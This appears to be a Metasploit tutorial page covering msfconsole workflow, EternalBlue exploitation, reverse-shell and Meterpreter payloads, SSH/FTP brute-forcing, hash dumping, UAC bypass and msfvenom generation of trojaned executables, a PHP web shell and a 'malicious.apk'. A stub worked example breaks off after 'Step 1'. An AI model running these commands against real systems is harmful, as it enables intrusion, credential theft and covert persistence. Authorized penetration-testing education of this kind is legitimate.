Metasploit Framework

Master the world's most popular penetration testing framework

Introduction to Metasploit

Metasploit is the world's most popular penetration testing framework. It provides a comprehensive platform for developing, testing, and executing exploit code against remote targets.

What is Metasploit?

  • Exploitation Framework: Automated exploit development and execution
  • Payload Generation: Create custom payloads for various platforms
  • Post-Exploitation: Maintain access and gather information
  • Vulnerability Assessment: Identify and validate security weaknesses
  • Social Engineering: Phishing and client-side attacks

Metasploit Editions

Community Edition

  • Free and open source
  • Command-line interface
  • Basic exploitation features
  • Limited payload options

Pro Edition

  • Commercial version
  • Web-based interface
  • Advanced reporting
  • Team collaboration

Express Edition

  • Entry-level commercial
  • Limited to 10 IPs
  • Basic web interface
  • Standard reporting

Getting Started with MSFconsole

MSFconsole is the primary interface for interacting with the Metasploit Framework.

# Starting Metasploit:
sudo msfconsole

# Basic Commands:
help                    # Show help menu
version                 # Show version information
exit                    # Exit Metasploit
quit                    # Same as exit

# Database Commands:
db_status              # Check database connection
db_rebuild_cache       # Rebuild module cache
workspace              # List workspaces
workspace -a test      # Add new workspace
workspace test         # Switch to workspace

# Search Commands:
search type:exploit platform:windows
search cve:2017-0144   # Search by CVE
search ms17-010        # Search by MS bulletin
search apache          # Search by service name

# Module Information:
info                   # Show module information
show options           # Show module options
show payloads          # Show compatible payloads
show targets           # Show available targets

Basic Workflow

  1. Search: Find appropriate exploit modules
  2. Use: Select and load the exploit module
  3. Configure: Set required options (RHOSTS, LHOST, etc.)
  4. Payload: Select and configure payload
  5. Exploit: Execute the exploit
  6. Post-Exploitation: Maintain access and gather information

Exploit Modules

Exploit modules contain the actual exploit code that takes advantage of specific vulnerabilities.

# Using Exploit Modules:

# Select an exploit:
use exploit/windows/smb/ms17_010_eternalblue

# Show exploit information:
info

# Show required options:
show options

# Set target host:
set RHOSTS 192.168.1.100

# Set payload:
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local host (for reverse connections):
set LHOST 192.168.1.10

# Set local port:
set LPORT 4444

# Check if target is vulnerable:
check

# Execute the exploit:
exploit
# or
run

# Background the session:
background

# List active sessions:
sessions -l

# Interact with session:
sessions -i 1

Payload Types

Payloads are the code that runs after successful exploitation. Different payload types serve different purposes.

# Payload Categories:

# Singles (Standalone):
windows/shell_reverse_tcp          # Simple command shell
linux/x86/shell_reverse_tcp        # Linux command shell
windows/x64/exec                   # Execute command

# Stagers (Small initial payload):
windows/meterpreter/reverse_tcp     # Meterpreter stager
linux/x86/meterpreter/reverse_tcp  # Linux Meterpreter stager

# Stages (Full-featured payload):
windows/meterpreter                 # Full Meterpreter
linux/x86/meterpreter              # Linux Meterpreter

# Common Payload Options:
LHOST    # Local host (attacker IP)
LPORT    # Local port (listening port)
RHOST    # Remote host (target IP)
RPORT    # Remote port (target port)

# Payload Selection:
show payloads                       # Show compatible payloads
set PAYLOAD windows/meterpreter/reverse_tcp
show options                        # Show payload options

Meterpreter

Meterpreter is Metasploit's advanced payload that provides a powerful post-exploitation platform.

# Meterpreter Features:
- In-memory execution (no files on disk)
- Encrypted communication
- Extensible through modules
- Cross-platform support
- Advanced post-exploitation capabilities

# Basic Meterpreter Commands:
help                    # Show help menu
sysinfo                 # System information
getuid                  # Current user
ps                      # Process list
pwd                     # Current directory
ls                      # List files
cd                      # Change directory
download file.txt       # Download file
upload file.txt         # Upload file
shell                   # Drop to system shell
background              # Background session
exit                    # Exit Meterpreter

Auxiliary Modules

Auxiliary modules perform supporting functions like scanning, fuzzing, and denial of service attacks.

# Scanner Modules:
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 21,22,23,25,53,80,110,443,993,995
run

# SMB Scanner:
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# HTTP Scanner:
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# SSH Scanner:
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# Brute Force Modules:
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# FTP Brute Force:
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME admin
set PASS_FILE passwords.txt
run

Popular Auxiliary Categories

  • Scanners: Port scanning, service detection, vulnerability scanning
  • Fuzzers: Input fuzzing for vulnerability discovery
  • DoS: Denial of service attacks
  • Spoof: ARP spoofing, DNS spoofing
  • Gather: Information gathering modules

Post-Exploitation Modules

Post-exploitation modules help maintain access and gather information after successful compromise.

# Post-Exploitation Workflow:
1. Gain initial access
2. Escalate privileges
3. Maintain persistence
4. Gather information
5. Pivot to other systems
6. Cover tracks

# Common Post Modules:
use post/windows/gather/hashdump      # Dump password hashes
use post/windows/gather/enum_shares   # Enumerate shares
use post/windows/gather/enum_applications  # Installed applications
use post/windows/gather/credentials/windows_autologin  # Auto-login creds
use post/multi/gather/env             # Environment variables

# Running Post Modules:
sessions -l                           # List sessions
use post/windows/gather/hashdump
set SESSION 1                         # Set target session
run

# Privilege Escalation:
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4445
run

Payload Generation with MSFvenom

MSFvenom is a standalone payload generator that replaced msfpayload and msfencode.

# MSFvenom Syntax:
msfvenom -p [payload] [options] -f [format] -o [output]

# List Payloads:
msfvenom --list payloads

# List Formats:
msfvenom --list formats

# List Encoders:
msfvenom --list encoders

# Windows Reverse Shell:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Linux Reverse Shell:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell

# PHP Web Shell:
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php

# Android APK:
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o malicious.apk

# Encoded Payload:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe

Common Output Formats

  • exe: Windows executable
  • elf: Linux executable
  • raw: Raw shellcode
  • c: C language format
  • python: Python script
  • powershell: PowerShell script

Step-by-step example of exploiting a vulnerable Windows system.

# Step 1: Start Metasploit

Best Practices and Ethics

Legal and Ethical Considerations

  • Authorization: Only test systems you own or have explicit permission to test
  • Scope: Stay within the defined scope of testing
  • Documentation: Keep detailed records of all activities
  • Responsible Disclosure: Report vulnerabilities appropriately
  • Data Protection: Protect any sensitive data encountered

Technical Best Practices

  • Lab Environment: Practice in isolated lab environments
  • Backup Plans: Have rollback procedures ready
  • Stealth: Use appropriate techniques to avoid detection
  • Cleanup: Remove artifacts after testing
  • Updates: Keep Metasploit updated with latest modules

Common Mistakes to Avoid

  • Wrong Payload: Using incompatible payload architectures
  • Firewall Issues: Not considering firewall restrictions
  • Session Management: Losing track of active sessions
  • Privilege Context: Not understanding current privilege level
  • Network Pivoting: Improper network routing configuration
